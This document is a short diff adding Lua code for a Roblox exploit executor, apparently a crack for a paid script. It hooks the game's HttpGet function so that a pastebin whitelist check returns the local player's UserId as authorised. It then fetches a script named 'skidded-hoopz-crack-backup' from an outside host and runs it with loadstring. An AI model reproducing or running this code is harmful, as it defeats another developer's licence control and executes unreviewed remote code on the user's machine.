@@ -1,0 +1,10 @@
+local userId = game.Players.LocalPlayer.UserId
+local old; old = hookfunction(game.HttpGet, function(...)
+    local args = {...}
+    if args[2]:match("pastebin.com/raw/Zi1zYdTz") then
+        return ([[return {[%s] = true}]]):format(userId) 
+    end
+    return old(...)
+end)
+
+loadstring(game:HttpGet("https://ataias.xyz/getScript?ID=skidded-hoopz-crack-backup"))()
